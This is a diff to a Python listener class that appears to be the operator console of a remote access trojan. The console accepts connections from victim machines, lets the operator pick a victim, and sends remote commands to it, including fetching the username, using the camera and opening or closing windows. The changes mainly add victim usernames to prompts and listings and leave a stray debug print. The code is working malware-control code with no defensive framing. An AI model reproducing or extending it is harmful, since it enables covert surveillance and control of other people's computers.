@@ -33,7 +33,10 @@ class Listener:
 			try:
 				self.listener.listen(0)
 				connection, address = self.listener.accept()
-				print(colored("\n[+] Got a connection from " + str(address), "green"))
+				self.chosen_connection = (connection, address)
+				username = self.execute_remotely("get username")
+				print(colored("\n[+] Got a connection from " + address[0] + "(" + username + ")", "green"))
+				self.chosen_connection = None
 				print("# Press Enter")
 				self.connections.append((connection, address))
 				self.listen()
@@ -43,8 +46,9 @@ class Listener:
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		if data == "exit":
-			for con in self.connections:
-				con[0].send(json_data.encode())
+			if self.connections:
+				for con in self.connections:
+					con[0].send(json_data.encode())
 		elif self.chosen_connection:
 			self.chosen_connection[0].send(json_data.encode())
 		else:
@@ -98,31 +102,37 @@ class Listener:
 	def run(self):
 		while True:
 			if self.chosen_connection:
-				user = self.chosen_connection[1][0]
+				# user = self.chosen_connection[1][0]
+				user = "(" + self.chosen_connection[1][0] + ") " + self.execute_remotely("get username")
 				command = input(f"{user} # ")
 			else: command = input(">>> ")
 
-			if command == "print":
-				connections = self.get_connections()
-				if connections:
-					for con in self.get_connections():
-						print(con[1])
-				else:
-					print(colored("[-] You don't have any connection yet", "red"))
+			# if command == "print":
+			# 	connections = self.get_connections()
+			# 	if connections:
+			# 		for con in self.get_connections():
+			# 			self.chosen_connection = con
+			# 			print("(" + con[1][0] + ") " + self.execute_remotely("get username"))
+			# 		self.chosen_connection = None
+			# 	else:
+			# 		print(colored("[-] You don't have any connection yet", "red"))
 
-			elif command == "choose":
+			if command == "choose":
 				connections = self.get_connections()
 				if connections:
 					for con in range(len(connections)):
-						connection = connections[con][1]
+						self.chosen_connection = connections[con]
+						connection = connections[con][1][0] + " (" + self.execute_remotely("get username") + ")"
 						print(f"{str(con+1)}. {connection}")
+					self.chosen_connection = None
 					chosen = input("Enter number of connection: ")
 					if not chosen.isdigit():
 						print(colored("[~] You must to enter number!", "yellow"))
 					elif int(chosen) <= len(connections):
 						chosen = int(chosen)
 						self.chosen_connection = connections[chosen - 1]
-						print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
+						username = " (" + self.execute_remotely("get username") + ")"
+						print(colored("[+] Chosen connection: " + str(self.chosen_connection[1][0]) + username, "green"))
 					else:
 						print(colored("[-] This connection does not exist!"))
 				else:
@@ -130,7 +140,8 @@ class Listener:
 
 			elif command == "chosen":
 				if self.chosen_connection:
-					print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
+					username = " (" + self.execute_remotely("get username") + ")"
+					print(colored("[+] Chosen connection: " + str(self.chosen_connection[1][0]) + username, "green"))
 				else:
 					print(colored("[-] You didn't choose any connection yet", "red"))
 
@@ -156,7 +167,9 @@ class Listener:
 
 			elif command == "exit":
 				self.exit()
-				self.execute_remotely("exit")
+				self.reliable_send("exit")
+				print("aldflakj")
+				exit()
 				break
 
 			elif command == "camera":
@@ -273,16 +286,20 @@ class Listener:
 						print(colored(res, "green"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
-			elif command == "window":
+			elif command == "open window":
 				if self.chosen_connection:
 					res = self.execute_remotely(command)
-					print(res)
+					if res.startswith("[+]"):
+						print(colored(res, "green"))
+					else: print(colored(res, "yellow"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command == "close window":
 				if self.chosen_connection:
 					res = self.execute_remotely(command)
-					print(res)
+					if res.startswith("[+]"):
+						print(colored(res, "green"))
+					else: print(colored(res, "yellow"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif len(command.split()):
